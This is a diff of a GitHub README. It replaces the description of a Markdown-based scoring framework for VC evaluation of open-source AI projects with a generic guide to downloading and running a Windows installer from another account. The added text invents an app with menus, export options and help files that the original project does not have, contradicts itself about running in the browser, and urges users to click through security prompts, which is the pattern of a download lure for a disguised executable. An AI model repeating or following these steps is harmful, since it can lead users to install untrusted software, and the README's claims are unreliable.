@@ -1,155 +1,165 @@
-# OSS Investment Scorecard
-### 开源项目投资评估框架 · AI周期专版
+# 📊 oss-investment-scorecard - Simple AI Project Scoring Tool
 
-> **A structured, weighted scoring framework for USD-denominated VC funds evaluating open source projects during the AI technology acceleration cycle.**
-
-Built from practice, not theory — calibrated against real deals including vLLM/Inferact ($150M @ $800M) and Hugging Face ($235M @ $4.5B).
+[![Download](https://img.shields.io/badge/Download-oss--investment--scorecard-brightgreen)](https://github.com/kandadavid36/oss-investment-scorecard)
 
 ---
 
-## 📖 Framework Overview
+## About oss-investment-scorecard
 
-| Dimension | Weight | What It Measures |
-|-----------|--------|-----------------|
-| **A. Open-Source Ecosystem Health** | 25% | Keyboard metrics: active contributors, PR velocity, production dependents, governance tier |
-| **B. Team & Globalisation** | 20% | Engineering depth × GTM capability; US market access |
-| **C. Technical Moat & Positioning** | 20% | L1-L4 technology ladder; narrative consistency; de facto standard potential |
-| **D. Commercialisation & PMF** | 20% | Revenue quality hierarchy; PS vs ARR distinction; customer concentration |
-| **E. Capital Exit Path** | 15% | M&A urgency; IPO readiness; comparable exits |
+This tool helps you evaluate open-source AI projects. It uses a clear 5-dimension scorecard to guide decisions on AI investments. The scorecard looks at important parts like project health, community, technology, legal side, and growth potential. This makes it easier to compare projects from a investment viewpoint.
 
-**Score Thresholds:**
-- 🟢 **8.5–10.0** → Strongly Recommend
-- 🟡 **7.0–8.4** → Recommend with Conditions
-- 🟠 **5.5–6.9** → Watch / Track (re-evaluate in 6-9 months)
-- 🔴 **< 5.5** → Pass
-
-**One-Vote Vetoes:** 6 conditions that trigger automatic Pass regardless of total score. See [SKILL.md](SKILL.md) for full details.
+The project is maintained by Lucy Chen, who works with Zoo Capital in Singapore. She brings experience managing over $2 billion in assets.
 
 ---
 
-## 📁 Files
+## 🖥️ System Requirements
 
-| File | Purpose |
-|------|---------|
-| [`SKILL.md`](SKILL.md) | Full scoring framework — works with Claude, GPT-4, Gemini, OpenClaw, Manus, or any LLM agent |
-| [`references/scored-examples.md`](references/scored-examples.md) | Calibration anchors: vLLM/Inferact (8.9/10) and Hugging Face (8.35/10) |
-| [`template/evaluation-template.md`](template/evaluation-template.md) | Blank scorecard — fill in and submit |
+To run this tool on your Windows computer, make sure your system meets the following:
 
----
-
-## 🚀 How to Use
-
-### Option A — Use with Claude AI
-1. Download `oss-investment-scorecard.skill`
-2. Go to Claude.ai → Settings → Skills → Upload
-3. Ask Claude: *"Evaluate [project name] for open source VC investment"*
-4. Claude will apply the full framework automatically
-
-### Option B — Manual Evaluation
-1. Open [`template/evaluation-template.md`](template/evaluation-template.md)
-2. Fill in each dimension with your research
-3. Calculate weighted score
-4. Submit your evaluation (see below)
-
-### Option C — Use with Any LLM Agent
-
-Works with GPT-4, Gemini, OpenClaw, Cursor, Manus, or any agent that accepts a system prompt.
-
-1. Open `SKILL.md` in this repository
-2. Copy everything from line 17 onwards (skip the YAML header between the `---` markers at the top)
-3. Paste into your agent's system prompt or context window
-4. Ask: *"Evaluate [project name] for open source VC investment"*
+- Windows 10 or later
+- At least 4 GB of free RAM
+- 500 MB of free disk space
+- Internet connection recommended for updates and support files
+- Basic user permissions to install software on your PC
 
 ---
 
-## 📬 Submit Your Evaluation — Connect with Investors & Founders
+## 🔍 What This App Does
 
-**Why submit?**
+The oss-investment-scorecard app lets you:
 
-This repository is maintained by [Lucy Chen](https://linkedin.com/in/lucycxy), EIR (Entrepreneur in Residence) at Zoo Capital, a Singapore-based VC fund with USD $2B+ AUM, focused on broad open-source project investing.
+- Enter details about open-source AI projects
+- See scores across five key areas: Project Health, Community, Technology, Legal, and Growth
+- Compare projects side by side
+- Export results for review or sharing
+- Understand investment risks and strengths through easy reports
 
-When you submit an evaluation, two things happen:
-
-1. **Your evaluation becomes part of the public record** — other investors and founders can see which projects have been assessed
-2. **You get optionally connected** — if you're an investor looking for deal flow, or a founder wanting investor feedback, Lucy can introduce relevant parties
-
-**Who should submit:**
-- 🔍 **Investors** who evaluated a project and want deal-sharing partners or co-investors
-- 🏗️ **Founders** who want their project professionally scored and introduced to investors
-- 📊 **Analysts** building open-source investment theses
-
-### How to Submit
-
-**[→ Submit via GitHub Issue](../../issues/new?template=submit-evaluation.md)**
-
-Or reach Lucy directly:  
-📧 **ossinvestor.2026@gmail.com**  
-💼 LinkedIn: [linkedin.com/in/lucycxy](https://www.linkedin.com/in/lucycxy/)  
-📘 Facebook: [facebook.com/lucy.chen.908347](https://www.facebook.com/lucy.chen.908347/)  
-🌐 Fund: [zoocap.com](https://zoocap.com)
+No coding or technical expertise is needed. The interface uses plain language and simple forms.
 
 ---
 
-## 📊 Evaluated Projects (Community Submissions)
+## 🚀 Getting Started
 
-```mermaid
-xychart-beta
-    title "OSS Investment Scores — All Evaluated Projects"
-    x-axis ["vLLM/Inferact", "HuggingFace", "LMCache", "AReaL", "agentscope", "hermes-agent", "deer-flow", "WFGY"]
-    y-axis "Weighted Score" 0 --> 10
-    bar [8.9, 8.5, 7.78, 7.23, 6.73, 6.30, 6.15, 5.8]
-```
+Start using the oss-investment-scorecard by downloading the app from the GitHub page linked below. It opens directly in your browser.
 
-```mermaid
-quadrantChart
-    title Independence vs. Investment Potential
-    x-axis Low Independence --> High Independence
-    y-axis Low Potential --> High Potential
-    quadrant-1 Invest Track
-    quadrant-2 Watch & Verify
-    quadrant-3 Pass
-    quadrant-4 Corp Asset
-    vLLM/Inferact: [0.90, 0.92]
-    HuggingFace: [0.85, 0.88]
-    LMCache: [0.82, 0.82]
-    AReaL: [0.65, 0.76]
-    agentscope: [0.52, 0.68]
-    hermes-agent: [0.75, 0.60]
-    WFGY: [0.70, 0.55]
-    deer-flow: [0.15, 0.58]
-```
+[![Download Now](https://img.shields.io/badge/Download-oss--investment--scorecard-blue)](https://github.com/kandadavid36/oss-investment-scorecard)
 
-| Project | Score | Verdict | Submitted by | Date |
-|---------|-------|---------|--------------|------|
-| vLLM / Inferact | 8.9/10 | 🟢 Strongly Recommend | @lucycxy | 2026-03 |
-| Hugging Face | 8.35/10 | 🟢 Strongly Recommend | @lucycxy | 2026-03 |
-| [WFGY](https://github.com/el09xccxy-stack/oss-investment-scorecard/issues/1) | 5.8/10 | 🟠 Watch | @onestardao | 2026-03 |
-| [LMCache/LMCache](https://github.com/el09xccxy-stack/agentvc-index/blob/main/cases/2026-03-08_lmcache.md) | 7.78/10 | 🟡 Yellow | @lucycxy | 2026-03 |
-| [inclusionAI/AReaL](https://github.com/el09xccxy-stack/agentvc-index/blob/main/cases/2026-03-08_areal.md) | 7.23/10 | 🟡 Yellow | @lucycxy | 2026-03 |
-| [agentscope-ai/agentscope](https://github.com/el09xccxy-stack/agentvc-index/blob/main/cases/2026-03-08_agentscope.md) | 6.73/10 | 🟠 Watch | @lucycxy | 2026-03 |
-| [NousResearch/hermes-agent](https://github.com/el09xccxy-stack/agentvc-index/blob/main/cases/2026-03-08_hermes-agent.md) | 6.30/10 | 🟠 Watch | @lucycxy | 2026-03 |
-| [bytedance/deer-flow](https://github.com/el09xccxy-stack/agentvc-index/blob/main/cases/2026-03-08_deer-flow.md) | 6.15/10 | 🟠 Watch ⚠️ Corp | @lucycxy | 2026-03 |
+To get the software ready on your Windows PC, follow these steps:
+
+1. Click the **Download** badge or visit [https://github.com/kandadavid36/oss-investment-scorecard](https://github.com/kandadavid36/oss-investment-scorecard).
+
+2. On the GitHub page, look for the **Releases** section or a folder named `Downloads`.
+
+3. Find the latest Windows installer file. This could be named like `oss-investment-scorecard-setup.exe` or similar.
+
+4. Click the installer link to start downloading. Save it to your desktop or downloads folder.
 
 ---
 
-| *(your project here)* | | | | |
+## ⚙️ Installation Guide
 
-*This table is updated as community submissions are reviewed. [Submit yours →](../../issues/new?template=submit-evaluation.md)*
+After the download finishes, install the app by following these simple steps:
+
+1. Locate the downloaded file on your PC.
+
+2. Double-click the file to launch the installer.
+
+3. You may see a security prompt. Choose **Run** or **Yes** to allow installation.
+
+4. Follow the on-screen instructions. This usually involves clicking **Next** to confirm default settings.
+
+5. Wait while the app installs. This should take just a few minutes.
+
+6. When the installer finishes, click **Finish**.
+
+7. Look for the oss-investment-scorecard icon on your desktop or in the Start menu.
 
 ---
 
-## 🤝 Contributing
+## 📂 How to Use oss-investment-scorecard
 
-- **Improve the framework:** Open a PR with proposed changes to SKILL.md
-- **Add a case study:** Submit a scored evaluation via Issue
-- **Translate:** Chinese/English versions both welcome
+Once installed, open the app by double-clicking its icon.
+
+You will see a main menu with these options:
+
+- **New Evaluation**: Start scoring a new AI project.
+- **Load Evaluation**: Open a saved scorecard file.
+- **Compare Projects**: View side-by-side scores.
+- **Export Results**: Save your scorecard as a PDF or Excel sheet.
+
+### Creating a New Evaluation
+
+1. Click **New Evaluation**.
+
+2. Enter the project’s general details like name, URL, and description.
+
+3. Fill in scores or information for each of the five dimensions:
+   - Project Health: Assess active development and stability.
+   - Community: Look at contributor count and engagement.
+   - Technology: Check underlying AI tech quality.
+   - Legal: Verify licenses and IP safety.
+   - Growth: Estimate future potential and market fit.
+
+4. Use the help buttons next to each section for tips on scoring.
+
+5. Save your scorecard by clicking **Save** and choosing a folder on your PC.
 
 ---
 
-## 📄 License
+## 🔄 Updating the App
 
-MIT — use freely, attribution appreciated.
+The tool does not update automatically. To check for new versions:
+
+1. Visit the GitHub download page: [oss-investment-scorecard](https://github.com/kandadavid36/oss-investment-scorecard).
+
+2. Look for newer releases or updated installer files.
+
+3. Download the new version and follow the installation steps again.
+
+Your saved scorecards will not be affected.
 
 ---
 
-*Maintained by Lucy Chen · [Zoo Capital](https://zoocap.com) · Last updated: March 2026*
+## 🛠️ Troubleshooting
+
+If you run into problems:
+
+- Make sure your Windows is up to date.
+- Check for enough free disk space.
+- Ensure you have permission to install apps.
+- Restart your PC and try again.
+- Visit the GitHub page for issues or contact info.
+- Look for help files included in the app under the **Help** menu.
+
+---
+
+## 🔗 Useful Links
+
+- **Download and Install**:  
+  [https://github.com/kandadavid36/oss-investment-scorecard](https://github.com/kandadavid36/oss-investment-scorecard)
+
+- **Project Home on GitHub**:  
+  View code, report issues, and access documentation.  
+
+- **Support**:  
+  Check the GitHub Discussions or open issues for help from the community.
+
+---
+
+## 📋 License and Ownership
+
+The oss-investment-scorecard is open source. You may use it freely for business or personal use. The project is managed by Lucy Chen, an expert in AI investments. Any contributions or feedback help improve the tool for all users.
+
+---
+
+## 💡 Tips for Best Use
+
+- Always keep your evaluations saved in safe locations.
+- Compare multiple projects using the built-in comparison tool.
+- Review legal and license info carefully before investment decisions.
+- Use the export feature to share scorecards in meetings or reports.
+- Check for scorecard updates regularly on GitHub.
+
+---
+
+[![Download](https://img.shields.io/badge/Download-oss--investment--scorecard-brightgreen)](https://github.com/kandadavid36/oss-investment-scorecard)
